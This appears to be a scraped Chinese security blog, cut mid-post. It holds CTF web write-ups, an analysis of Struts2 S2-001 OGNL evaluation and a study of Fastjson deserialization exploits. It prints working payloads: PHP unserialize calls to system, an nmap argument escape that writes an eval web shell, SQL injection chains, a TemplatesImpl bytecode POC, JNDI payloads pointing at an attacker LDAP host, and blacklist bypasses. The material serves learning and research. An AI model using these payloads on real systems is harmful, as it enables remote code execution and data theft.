flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} 找到 flag 1func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} [网鼎杯 2020 朱雀组]Nmap类似于 Online Tools，应用了 escapeshellarg()+escapeshellcmd()，导致逃逸。 两种方法 12127.0.0.1' -iL /flag -oN flag.txt ' # 利用 nmap 参数， -iL 从指定文件读取主机/IP 进行扫描，-oN 将扫描结果写入指定文件' &lt;?= @eval($_POST[&quot;pd&quot;]);?&gt; -oG pd.phtml ' # 写入 shell ，由于过滤了 php ，使用 &lt;?= 和 phtml 进行绕过 [网鼎杯 2020 青龙组]ArdeUSerialz123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081 &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); }}function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;}if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); }} 反序列化，process 中需要使 op 为 2，然后在 read 中读取 flag.php。所以需要把 op 改成 2，filename 改成 flag.php。 记录一下，private 成员序列化的格式为 %00ClassName%00Attribute，protected 成员格式为%00*%00Attribute。正常 payload 1O:11:&quot;FileHandler&quot;:3:{s:5:&quot;%00*%00op&quot;;s:1:&quot;2&quot;;s:11:&quot;%00*%00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;%00*%00content&quot;;s:1:&quot;a&quot;;} 会使用===判断 op 是否为 &quot;2&quot;，可以利用弱类型特性，传入数字 2. 由于使用了%00，不能通过 is_valid，将序列化后的字符串中的 s改为S，后面的字符串就可以使用 16 进制表示。 执行__destruct()时，目录不再是该文件位置（？），所以需要使用绝对路径读取文件。可以通过读取 /proc/self/cmdlie获取配置文件路径，在配置文件中得到 web 绝对路径。 12345678910&lt;?phpclass FileHandler{ protected $op=2; protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}$a = serialize(new FileHandler);$a = str_replace(chr(0),'\\00',$a);$a = str_replace('s:','S:',$a);echo urlencode($a);# PD9waHAgJGZsYWc9J2ZsYWd7ZDg2ZWRiMjMtNzk0Zi00NDI4LTllNTQtZmQ2NDk2YmNmMjBlfSc7Cg== 在 php 7.1+ 环境中，对属性类型不敏感，也可以使用 public 属性来绕过。 [网鼎杯 2018]Fakebook注册一个账号，点进去能看见自己的资料和博客内容。同时发现no=1，尝试注入。 sqlmap告诉我它可以注，但是没跑出来，手注。 12345678910no=1' //报错no=1 and 1=1 //正常,sql语句应该是 select ... from ... where id = nono=1 order by 4 //正常no=1 order by 5 //报错，有4列no=0 union select 1,2,3,4 //nohack 有过滤no=0/**/union/**/select/**/1,2,3,4 //用/**/绕过空格，发现2可以显示，同时知道了网站的绝对路径是/var/www/htmlno=0/**/union/**/select/**/1,group_concat(schema_name),3,4/**/from/**/information_schema.schemata //查库，发现fakebookno=0/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=%27fakebook%27 //查表，得到usersno=0/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=%27users%27 //查列，得到no,username,passwd,datano=0/**/union/**/select/**/1,group_concat(data),3,4/**/from/**/users //得到O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;A&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:5:&quot;a.com&quot;;}，一个序列化的用户信息 同时有两个信息 12Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31Fatal error: Call to a member function getBlogContents() on boolean in /var/www/html/view.php on line 67 猜测view.php把从数据库中查出的字符串反序列化后执行getBlogContents方法 看一下robots.php，发现有user.php.bak，知道了getBlogContents方法是调用curl_exec，curl_exec可以接受file://协议，于是最终payload 1no=0/**/union/**/select/**/1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:5;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' flag在iframe标签里 [Zer0pts2020]Can you guess it?123456789101112131415161718192021&lt;?phpinclude 'config.php'; // FLAG is defined in config.phpif (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) { exit(&quot;I don't know what you are thinking, but I won't let you read it :)&quot;);}if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit();}$secret = bin2hex(random_bytes(64));if (isset($_POST['guess'])) { $guess = (string) $_POST['guess']; if (hash_equals($secret, $guess)) { $message = 'Congratulations! The flag is: ' . FLAG; } else { $message = 'Wrong.'; }} random_bytes没有查到什么问题，生成的随机数强度非常高，重点在上面的$_SERVER[PHP_SELF]上面 $_SERVER['PHP_SELF']指的是运行的 PHP 脚本，上面匹配到这个$_SERVER['PHP_SELF']之后就退出，但是下面的highlignt_file显示的是basename($_SERVER['PHP_SELF']) 1basename('/index.php/config.php') # config.php 因此我们只需要绕过第一个正则表达式即可，fuzz 一下可以绕过 12345678import requestsurl = 'http://6de85585-1529-4b55-b532-e510c9ddcf3e.node3.buuoj.cn/index.php/config.php/{}?source'for i in range(255): r = requests.get(url.format(chr(i))) if '{' in r.text: print(r.text) [ZJCTF 2019]NiZhuanSiWei第一步绕过text，可以使用data://或者php://input伪协议。第二步用php://filter读取useless.php，http://4a66ab84-c72b-4d9c-bafd-19fab18c72d0.node3.buuoj.cn/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php，得到Flag类的结构。第三步读取flag.php，序列化一个Flag对象，用php://filter读flag。 12345678&lt;?phpclass Flag{ public $file; } $s = new Flag();$s-&gt;file='php://filter/read=convert.base64-encode/resource=flag.php';echo serialize($s);?&gt; 得到O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;} 最终payload 1http://4a66ab84-c72b-4d9c-bafd-19fab18c72d0.node3.buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;} [0CTF] 2016 piapiapia扫一下，发现www.zip，走一遍正常流程，注册，登录，更新资料，查看资料。 flag在config.php里，目的是要读到config.php，找一下能读文件的位置。 在profile.php找到file_get_contents($profile['photo']);，看一下能不能使$profile['photo']==’config.php‘，往上面找，profile来源于show_profile()反序列化，再看一下showprofile。 showprofile中，username经过过滤，无法注入（但过滤是很奇怪的），然后从数据库中查询到序列化的字符串，反序列化得到profile，再看看update_profile()。 updateprofile中，把username和newprofile过滤，其中newprofile是序列化后的表单内容，接下来重点看filter。 123456789public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string);} 进行了转义，如果发现 select, insert, update, delete, where会把它们变成hacker。对于profile来说，已经序列化的字符串长度时固定的，比如s:8:&quot;nickname&quot;;s:5:&quot;where&quot;，如果把where变成hacker，后面就变成s:5:&quot;hacker&quot;，反序列化时最后的引号就逃逸了。于是我们希望利用nickname这项来逃逸字符，使得最后的photo值为config.php。 nickname也有过滤 12if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); 可以用数组绕过。 正常序列化后的profile是 a:4:{s:5:&quot;phone&quot;;s:11:&quot;12312312123&quot;;s:5:&quot;email&quot;;s:12:&quot;aaaaa@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;where&quot;;}s:5:&quot;photo&quot;;s:14:&quot;upload/somemd5&quot;;}，我们希望逃逸出的字符串是&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}，总共是34个字符，因此需要34个where，希望构成a:4:{s:5:&quot;phone&quot;;s:11:&quot;12312312123&quot;;s:5:&quot;email&quot;;s:12:&quot;aaaaa@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} (后面还有一些)，这样where替换成hacker的时候后面的config.php就会赋值给photo 最后的payload，要在burp里面把nickname改成数组，内容是wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} ，在img的src里面能发现base64编码后的config.php，解码得到flag CG-CTFweb层层递进一直找iframe标签border那些都是0对应的文件，找到小故事，查看源代码的js文件名可以连成flag php decode看出题目是返回一个处理后的字符串，eval改为echo mysql看robots.txt，应该是要查询id=1024的内容，但是id==1024要得到false，利用intval，可以用1024e1，或者1024.1","link":"/2019/10/05/writeup/"},{"title":"Struts2 漏洞 S2-001","text":"Struts2 系列（希望能是个系列） Struts2 介绍Struts2 使用 Webwork2 为代码基础，以 xwork 为底层实现的核心，ognl 作为浏览器与 Java 对象数据流转沟通的语言。 Struts2 中请求从输入到输出的过程： struts2.xml 的核心作用： 标签的解析过程： 解析标签是从 doStartTag 开始的，TextFieldTag 从父类 AbstractTag 的父类 继承了该方法 OGNLStruts2 漏洞多数是 OGNL 表达式解析的漏洞。 Object-Grafph Navigation Language，一种表达式语言。OGNL 有三大要素： 表达式 （Expression） 表达式是 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL 操作到底要干什么。 根对象（Root Object） 跟对象是 OGNL 的操作对象，表达式规定干什么，跟对象指定对谁干 上下文环境（Context） 规定 OGNL 的操作环境，其中包含了根对象。跟对象作为一个特殊变量进行处理，对于根对象的存取操作的表达式不需要加 # 进行区分。 实现，root 对象和 上下文环境都是 OgnlValueStack 的属性值。 root 对象是一个栈，每一次请求会将请求的 action 压栈，所以在 URL 中可以输入 action 中的属性进行赋值，在参数拦截器中会从 root 栈的栈顶到栈底一次寻找同名的属性进行赋值。 Context 的对象是一个 Map，其中 key 是对象的引用，value 是对象具体的存储信息。其中存储了 OgnlValueStack的引用。 表达式操作，实际就是对 OgnlValueStack 中对象的操作： 对 root 对象的访问 name，获取 root 对象中 name 属性的值 department.name，获取 root 对象中 department 属性的 name 属性的值 department['name']，department[&quot;name&quot;]，获取 root 对象中 department Map key 为 name 的值 对 context 上下文环境的访问，# #introduction，获取上下文环境中名为 introduction 对象的值 #parameters.user #parameters['user']，#parameters[&quot;user&quot;] 对静态变量、静态方法的访问，@class@filed/method @com.example.core.Resource@ENABLE，访问该类的 ENABLE 属性 @com.example.core.Resource@get()，调用该类的 get 方法 方法调用，与 Java 方法调用相同 group.containsUser(#requestUser)，调用 root 对象中 group 中的 containsUser 方法，参数为 context 中名为 requestUser 的对象。 S2-001远程调试 Vulhub 中的 S2-001，找到标签解析的位置 doStartTag getBean 会调用到 UIBean 的构造函数，获取标签属性。this.populateParams 设置一些标签的属性值。最后经过判断返回不同的值。 doStartTag 结束后会进入 doEndTag 函数，跟进 end 函数 end 首先调用了 evaluateParams 函数，此函数解析每个标签的属性 并且在满足一系列条件时，会组成表达式，并调用 findValue。可以看到此时的标签 name 属性是 username，所以其实 username 也可以触发漏洞 这里还是以输入 password 为 %{1+1} 为例，运行到上图位置，这里会先将 expr 赋值为 %{1+1}，然后判断 altSyntax 可以看到，此处的 this.stack 是一个 OgnlValueStack，包含 root 和 context ，root 是一个 ArrayList 实现的栈，context 是一个 Map isUseAltSyntax 会 return 1234altSyntax|| context.containsKey(&quot;useAltSyntax&quot;) &amp;&amp; context.get(&quot;useAltSyntax&quot;) != null &amp;&amp; &quot;true&quot;.equals(context.get(&quot;useAltSyntax&quot;).toString()) 结果为 true altSyntax 功能是 Struts 2 框架用于处理标签内容的一种新语法( 不同于普通的 HTML ) , 该功能主要作用在于支持对标签中的 OGNL 表达式进行解析并执行 . 该功能在struts2核心配置文件struts.properties中默认开启 . 于是此处 expr 变为 %{password}。随后调用 this.findValue(expr, valueClazz) if 条件满足，会进入 TextParseUtil.translateVariables('%', expr, this.stack) 第一轮循环，首先解析表达式，找到匹配的大括号，确定%{...}中间内容的索引（start 和 end），最终取到 var，本例中为 password 此处的 o 来自于Object o = stack.findValue(var, asType);，获取的是 password 真正的值，即 %{1+1}。findValue 执行了 OGNL 表达式。 findValue 是一个从表达式生成语法树，然后执行的过程 282 行，OgnlUtil.getValue，进入 compile，把表达式编译成语法树？ 最后进入 Ognl.getValue，执行表达式 TextUtils.stringset判断字符串是否为 null 或者空字符串，两者都不是则返回 True。显然 left 为%{，right 为 }，stringset 返回 true。最后expression 被赋值为%{1+1}，进行第二轮循环。 第二轮循环中，expression 为 %{1+1}，其他无区别，在 stack.findValue 时返回结果为 2，expression 为 2，进入第三轮循环。 第三轮循环中，expression 为 2，不存在%{，start 为 -1，return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);，返回了 2，随后输出到用户界面。 漏洞的关键在于循环会多次进行，直至 expression 不再是 OGNL 表达式。修复时，增加了 loopCount 和 maxLoopCount 1234if (loopCount &gt; maxLoopCount) { // translateVariables prevent infinite loop / expression recursive evaluation break;} 参考从零带你看 struts2 中 ognl 命令执行漏洞 (seebug.org) Struts2学习（1）：Struts2框架结构详解_欢迎来到Jimmy的博客-CSDN博客_struts框架详解 CVE-2007-4556 Struts2_001 Remote Code Execution 远程代码执行漏洞分析 - H0t-A1r-B4llo0n (guildhab.top) Struts2框架: S2-001 漏洞详细分析 - 老路的博客 (dean2021.github.io) XWork框架的元素详解 - 老路的博客 (dean2021.github.io)","link":"/2021/08/30/struts2/"},{"title":"Fastjson 漏洞相关","text":"FastJSON 漏洞分析 概述Fastjson 是阿里巴巴维护的开源 JSON 库，特点是速度较快，支持特性较多，经常爆洞。常用于 Web 和安卓的序列化和反序列化中。 支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化为 Java Bean。 常用方法： JSON.toJSONString(Object[, SerializerFeature])，将对象序列化为 JSON 格式，如果指定 SerializerFeature.WriteClassName，会将类名记录到 JSON 中（使用@type标记） JSON.parse(Json)，将 JSON 字符串反序列化为对象并返回，要求该 JSON 必须有 @type 标记 JSON.parseObject(Json)，返回com.alibaba.fastjson.JSONObject类 JSON.parseObject(Json, Object.class)，返回@type指定的类 JSON.parseObject(Json, User.class, Feature.SupportNonPublicField)，反序列化时接受私有成员 使用序列化时，所有 public 字段和具有 get 方法的 private 字段都能被序列化。 反序列化时，无 set 方法的 privaate 字段不会被反序列化，除非指定 Feature.SupportNonPublicField。 环境搭建JDK 版本 1.8.211 使用 Spring Boot 搭建测试环境，在 pom.xml 中添加对应 FastJSON 依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.23&lt;/version&gt; &lt;/dependency&gt; 测试页面 123456789101112import com.alibaba.fastjson.*;import com.alibaba.fastjson.parser.Feature;import org.springframework.web.bind.annotation.*;@RestControllerpublic class Victim { @PostMapping(&quot;fastjson&quot;) public String vuln(@RequestBody String s){ JSONObject obj = JSON.parseObject(s, Feature.SupportNonPublicField); return &quot;OK&quot;; }} 漏洞利用FastJSON 1.2.24 反序列化使用 1.2.23 版本 漏洞存在于 AutoType，可以反序列化任意类，POC： 12{&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQANQoABwAmCgAnACgIACkKACcAKgcAKwoABQAmBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMcG9jOwEACkV4Y2VwdGlvbnMHAC0BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAQTWV0aG9kUGFyYW1ldGVycwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACWhhRm5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALgEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAvAQAKU291cmNlRmlsZQEACHBvYy5qYXZhDAAIAAkHADAMADEAMgEACGNhbGMuZXhlDAAzADQBAANwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAADAAEAA0ADQAOAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwAZAAAADQMAEwAAABUAAAAXAAAAAQARABoAAwAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAbABwAAgAPAAAABAABAB0AGQAAAAkCABMAAAAbAAAACQAeAB8AAwAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAGgAIABsADAAAABYAAgAAAAkAIAAhAAAACAABACIADgABAA8AAAAEAAEAIwAZAAAABQEAIAAAAAEAJAAAAAIAJQ==&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:{ },&quot;_outputProperties&quot;:{ },&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;} 使用 TemplatesImpl 利用链执行任意字节码，_bytecodes为如下恶意类 12345678910111213141516171819202122import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class poc extends AbstractTranslet { public poc() throws IOException { Runtime.getRuntime().exec(&quot;calc.exe&quot;); } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) { } public void transform(DOM document, SerializationHandler[] haFndlers) throws TransletException { } public static void main(String[] args) throws Exception { new poc(); }} POST 以上 POC，可以成功弹出计算器。 跟踪调试，在JSON.parseObject(s, Feature.SupportNonPublicField)处下断点，获取传入特性后解析 进入 parser.parse()，由于传入的 JSON 第一个字符是左大括号，所以进入 LBRACE， 开始解析字符串，通过scanSymbol解析双引号之间的值（@type） 并且获取了传入类的 class 进入 deseriailizer.deserialze()，进行反序列化操作，依次解析 JSON 中的各个字段，第一个字段是outputProperties，类型是java.util.Properties， 当 key 是_outputProperties时，matchfield 为 false，会进入parseField 进入 setValue，触发 TemplatesImpl 利用链 弹出计算器。 再次研究之前的基本上就是复现了一遍，对原理基本没有了解。所以再来重新研究。 反序列化过程传入一个带有类型的正常的 Json 进行反序列化，调试反序列化过程，secret 为 private 字段 1{&quot;@type&quot;:&quot;net.yanqs.springtest.FastjsonDemo.User&quot;,&quot;age&quot;:10,&quot;secret&quot;:&quot;secret&quot;,&quot;username&quot;:&quot;sijidou&quot;} 反序列化方法为 1JSON.parseObject(s, Feature.SupportNonPublicField); 获取特性后，进入 parse 创建了一个 DefaultJSONParseer，开始解析 其中， JSONLexer（词法分析器？） 表示了传入的 JSON 字符串，包含了字符串的长度，目前解析到的位置等等信息 如果当前位置是{或者[，则调用 next 方法继续向下，否则获取内容到 nextToken。 由于第一个字符是{，因此进入 next。在 next 中，将当前字符串的位置记录一下，并判断字符串是否已经结束。 在 lexer 中记录 Token 的值（LBRACE，12），DefaultJSONParser构造完成，接下来调用它的 parse 方法。 switch(lexer.token()) 为 12，进入 case LBRACE 创建一个新的 JSONObject，如果 OrderedField 启动则使用 LinkedHashMap 存储，否则使用 HashMap。随后调用 parseObject。 parseObject 中处理一些 token 不正常的情况，进入解析的过程。 首先跳过空白，如果特性中设定了允许任意逗号，则也跳过逗号。所以在开启情况下可以使用类似payload，{,\\t,\\n,&quot;@type&quot; 如果下个字符是双引号，则进入 scanSymbleTable，返回下一个双引号之前的字符串。比如本例中会返回@type。scanSymbleTable 中会进行十六进制和 Unicode 解码，因此可以进行编码来做简单的绕过。另外同样也会忽略注释。 这里的 JSON.DEFAULT_TYPE_KEY 就是@type，进入并获取 typeName，类的全名，然后执行 loadClass。如果 loadClass 结果是 null，也把它放到结果的数组里，否则继续。进行一系列判断后，getDeserilizer 然后 deserialze getDeserializer get 查找类是否在已经存在的 Map 里，如果有就直接返回现成的 deserializer。如果是 Class&lt;?&gt;类型，调用该类型的 getDeserializer，继续类似上面的过程，替换 className 中的$为.，应该是将内部类的符号换成普通的符号后，出现了一个 denylist 不知道为啥 denyList 里俩 Thread = = 判断将要反序列化的类是不是几个特殊的类之一，是的话添加一些相关的类 1234java.awt.java.time.java.util.Optionaljava.nio.file.Path 然后获取当前 classloader 尝试加载，然后再来 get，当然还是 get 不到。最后判断 clazz 是不是一些特殊的类，如果都不是，最后创建一个 JavaBeanDeserializer 返回。 跟进 createJavaBeanDeserializer，经过一系列判断 asmEnable，进入JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);，在这个 build 方法中，创建将要反序列化的对象 获取到默认的构造方法后，设置可见性 接下来获取 getter setter 和 getter 被获取到需要满足几个条件：方法名长度至少为4，不是静态方法，无返回值或返回值为声明它的类（此处存疑），接受 1 个参数，开头是 set 根据方法名获取字段，支持 Unicode 获取字段，根据是不是布尔类型分两种情况 获取 getter ，逻辑类似于获取 setter，要求方法名长度大于 4，非静态，开头是 get，第四个字符大写，不接受参数 另外还要求返回值能够满足以下条件之一： 后面其中有一点比较重要。如果一个 field 存在 setter，则它的信息在获取 setter 时就会呗获取到，此时就无法获取 getter。当无 setter 时，fieldInfo == null，才能获取 getter。 全部处理完成后，使用获取的这些信息创建 JavaBeanDeserializer。稍后进行 deserialize 方法。 根据以上分析，修改 secret 字段的类型为 Properties 即可成功在反序列化时调用 getProperties 方法。 123456789101112131415161718192021222324public class User { private int age=10; public String username=&quot;init&quot;; private Properties secret= new Properties( ); public int getAge() { System.out.println(&quot;getAge called&quot;);return age; } public void setAge(int age) { age = age; } public String getUsername() { System.out.println(&quot;getUsername called&quot;);return username; } public void setUsername(String username) { this.username = username; } public Properties getSecret() { System.out.println(&quot;getSecret called&quot;); return secret; } @Override public String toString() { return this.age + &quot;,&quot; + this.username + &quot;,&quot; + this.secret; }} &lt;= 1.2.24换了 1.2.24 版本，继续分析。 TemplatesImpl Gadget这就是上面复现过程中使用的 gadget，利用条件比较苛刻，需要服务端开启 Feature.SupportNonPublicField。这个 TemplatesImpl 也是反序列化中常用的利用链。在 fastjson 中能够利用成功关键在于能够调用 getOutPutProperties方法 这个类中存在 _outputProperties 这个字段和 getOuputProperties getter，但是不存在 setter。同事返回值的类型是 Properties，它继承了 HashMap，间接继承了 Map。满足了所需的要求，所以可以调用。 JDBC Gadget1{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.183.1:389/obj&quot;,&quot;autoCommit&quot;:true} 本质上是一个 JNDI 注入，获取到的 autoCommit 方法造成 JNDI 注入 connect 方法中调用 lookup，造成 JNDI 注入 修复默认关闭了 AutoType，并且加入了黑白名单机制。 1.2.23 中的相关部分： 322 行的 loadClass，在 1.2.25 中改为了 checkAutoType 在 AutoType 打开或者指定了 expectClass 的情况下，指定的 TypeName 如果在百名单中，则直接 loadClass，黑名单中抛出错误。 loadClass 绕过在 AutoType 被手动打开的情况下，可以通过 loadClass 的截断特性绕过黑名单。 12Lcom.sun.; =&gt; com.sun.[com.sun. =&gt; com.sun. 1.2.42 中检查是否以L开头以;结尾，是则截断第一个和最后一个字符。所以可以双写绕过。LLcom.sun.;;。后续修复检查是否以L开头以;结尾，此时可以使用L绕过。最后修复了L，无法绕过。 &lt;=1.2.47缓存绕过无需开启 Autotype 即可 RCE 12345[{&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;}, {&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true} ] 不开启 autotype 的情况下，解析 java.lang.class 的时候不会进入下图中的第一个判断 而是直接返回 java.lang.class 随后获取 Class 对应的 Deserializer，是 Misccodec 在 deserialize 方法中，解析了 objVal 的值，即JdbcRowSetImpl 然后进行了 loadClass,，此处的 strVal 为 (String)objVal FastJSON 有缓存机制，每次 deserialize 获取到的 value 会存放在一个 map 中。 在解析数组的第二项即JdbcRowSetImpl时，在 getFromMapping 中会获取到 FastJSON 的缓存，即 JdbcRowSetImpl，直接返回了该类，从而绕过了 checkAutotype 随后的修复默认关闭了缓存，这样就无法绕过 checkAutotype 了。 &lt;= 1.2.68AutoCloseable 绕过1.2.68，有限制，需要已知存在问题并且实现了 AutoCloseable 的类 1{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;class.to.be.deserialized&quot;} 重点在于 expectClassFlag，当第一次进入 checckAutotype 时，改变了 expectClass，当第二个类为第一个类的子类时，判断 expectClass 成功，会进行 loadClass。但是条件比较苛刻，要求服务器上存在危险的类才能利用，总体来说难度较大。 随后的修复中，将java.lang.AutoCloseable，java.lang.Readable，java.lang.Runnable加入黑名单. 工具详细分析使用 vulhub 的环境和 JNDI 注入的 payload 攻击，用 marshalsec 开启 JNDI 服务并使受害者加载远程恶意类，192.168.183.1 为攻击者，192.168.183.128 为受害者，远程类 TouchFile 存放在 192.168.183.1:8080，抓包分析，数据包，[RMI文档](Java Remote Method Invocation: 10 - RMI Wire Protocol (oracle.com)) 